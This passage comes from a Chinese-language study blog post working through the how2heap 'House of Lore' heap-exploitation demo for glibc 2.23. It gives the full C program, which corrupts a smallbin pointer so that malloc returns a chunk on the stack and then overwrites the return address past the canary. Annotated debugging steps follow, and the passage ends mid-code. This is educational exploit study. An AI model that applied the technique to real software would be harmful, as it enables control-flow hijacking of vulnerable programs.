punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span> argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token class-name\">intptr_t</span><span class=\"token operator\">*</span> stack_buffer_1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token class-name\">intptr_t</span><span class=\"token operator\">*</span> stack_buffer_2<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nWelcome to the House of Lore\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"This is a revisited version that bypass also the hardening check introduced by glibc malloc\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\\n\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Allocating the victim chunk\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  <span class=\"token class-name\">intptr_t</span> <span class=\"token operator\">*</span>victim <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Allocated the first small chunk on the heap at %p\\n\"</span><span class=\"token punctuation\">,</span> victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>  <span class=\"token comment\">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>  <span class=\"token class-name\">intptr_t</span> <span class=\"token operator\">*</span>victim_chunk <span class=\"token operator\">=</span> victim<span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"stack_buffer_1 at %p\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>stack_buffer_1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"stack_buffer_2 at %p\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>stack_buffer_2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Create a fake chunk on the stack\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted\"</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>         <span class=\"token string\">\"in second to the last malloc, which putting stack address on smallbin list\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>  stack_buffer_1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>  stack_buffer_1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>  stack_buffer_1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> victim_chunk<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 \"</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>         <span class=\"token string\">\"in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake \"</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>         <span class=\"token string\">\"chunk on stack\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>  stack_buffer_1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">intptr_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>stack_buffer_2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>  stack_buffer_2<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">intptr_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>stack_buffer_1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"65\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Allocating another large chunk in order to avoid consolidating the top chunk with\"</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>         <span class=\"token string\">\"the small one during the free()\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>p5 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Allocated the large chunk on the heap at %p\\n\"</span><span class=\"token punctuation\">,</span> p5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Freeing the chunk %p, it will be inserted in the unsorted bin\\n\"</span><span class=\"token punctuation\">,</span> victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>  <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nIn the unsorted bin the victim's fwd and bk pointers are the unsorted bin's header address (libc addresses)\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"victim->fwd: %p\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>victim<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"victim->bk: %p\\n\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>victim<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"This means that the chunk %p will be inserted in front of the SmallBin\\n\"</span><span class=\"token punctuation\">,</span> victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>p2 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">1200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\\n\"</span><span class=\"token punctuation\">,</span> p2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"The victim chunk has been sorted and its fwd and bk pointers updated\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"victim->fwd: %p\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>victim<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"victim->bk: %p\\n\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>victim<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>  <span class=\"token comment\">//------------VULNERABILITY-----------</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now emulating a vulnerability that can overwrite the victim->bk pointer\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>  victim<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">intptr_t</span><span class=\"token punctuation\">)</span>stack_buffer_1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// victim->bk is pointing to stack</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>  <span class=\"token comment\">//------------------------------------</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now allocating a chunk with size equal to the first one freed\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>p3 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>p4 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 为什么还需要申请一个 P4，申请完 p3 不就直接可以直接到了想要的地方吗：p4 就是想要的栈块，但是 buffer2 在干什么；buffer2 是让我们看其 fd 指针被修改了</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"p4 = malloc(0x100)\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\\n\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>         stack_buffer_2<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\np4 is %p and should be on the stack!\\n\"</span><span class=\"token punctuation\">,</span> p4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// this chunk will be allocated on stack</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>  <span class=\"token class-name\">intptr_t</span> sc <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">intptr_t</span><span class=\"token punctuation\">)</span>jackpot<span class=\"token punctuation\">;</span> <span class=\"token comment\">// Emulating our in-memory shellcode</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>  <span class=\"token keyword\">long</span> offset <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token function\">__builtin_frame_address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>p4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>  <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>p4<span class=\"token operator\">+</span>offset<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>sc<span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// This bypasses stack-smash detection since it jumps over the canary  。。。对这里的 + 8 不太明白，猜测是越过 rbp 到返回地址，程序最后执行了 jackpot 函数也证实了这个想法</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>  <span class=\"token comment\">// sanity check</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>  <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token function\">__builtin_return_address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>jackpot<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这个例子是对 smallbin 的 bk 指针进行修改，指到栈上 (buffer1)，也修改了 buffer1 和 buffer 的 fd 和 bk 指针，修改 fd 指针就是为了绕过申请 smallbin 时的检测，最后就是假设了一个 shellcode 然后复制到 canary 后面的区域执行</p>\n<p><code>long offset = (long)__builtin_frame_address(0) - (long)p4;</code>  代码里有这么一行，然后查了查发现 <code>__builtin_frame_address(LEVEL)</code>  是一个内建函数</p>\n<p>这个函数是用来查看函数的栈帧地址 [ <code>__builtin_frame_address</code>  可用于确定是否已到达堆栈顶部]</p>\n<pre><code>0：查看当前函数的栈帧地址\n1：查看当前函数调用者的栈帧地址\n</code></pre>\n<p>【关于内建函数：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemhhaXh1ZS5jYy9jLWFybS9jLWFybS1idWlsdGluLmh0bWw=\">https://www.zhaixue.cc/c-arm/c-arm-builtin.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ydW5lYm9vay5kZXYvemgvZG9jcy9nY2MvcmV0dXJuLWFkZHJlc3MlRTMlODAlOTE=\">https://runebook.dev/zh/docs/gcc/return-address】</span></p>\n<h2 id=\"2调试程序\"><a class=\"anchor\" href=\"#2调试程序\">#</a> 2. 调试程序</h2>\n<h3 id=\"1执行到50行\"><a class=\"anchor\" href=\"#1执行到50行\">#</a> 1. 执行到 50 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">intptr_t</span><span class=\"token operator\">*</span> stack_buffer_1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 创建栈</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token class-name\">intptr_t</span><span class=\"token operator\">*</span> stack_buffer_2<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nWelcome to the House of Lore\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"This is a revisited version that bypass also the hardening check introduced by glibc malloc\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\\n\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Allocating the victim chunk\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token class-name\">intptr_t</span> <span class=\"token operator\">*</span>victim <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 申请一个可以释放到 smallbin 的 chunk</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Allocated the first small chunk on the heap at %p\\n\"</span><span class=\"token punctuation\">,</span> victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token comment\">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token class-name\">intptr_t</span> <span class=\"token operator\">*</span>victim_chunk <span class=\"token operator\">=</span> victim<span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获得头指针的地址</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"stack_buffer_1 at %p\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>stack_buffer_1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"stack_buffer_2 at %p\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>stack_buffer_2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这一部分就开始初步的申请空间</p>\n<pre><code>buffer1=0x7fffffffdcc0\nbuffer2=0x7fffffffdca0\nvictim=0x555555759010\nvictim_chunk=0x555555759000\n</code></pre>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/2%7D%7EUCP%5BAKA5NE%24H%60%25O0B%7E04.png\" alt=\"\" /></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/Z7J%7BIIG%28JOEBS6%28YD%5D%25W0OL.png\" alt=\"\" /></p>\n<h2 id=\"2执行到63行\"><a class=\"anchor\" href=\"#2执行到63行\">#</a> 2. 执行到 63 行</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Create a fake chunk on the stack\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>         <span class=\"token string\">\"in second to the last malloc, which putting stack address on smallbin list\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  stack_buffer_1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//pre_size</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  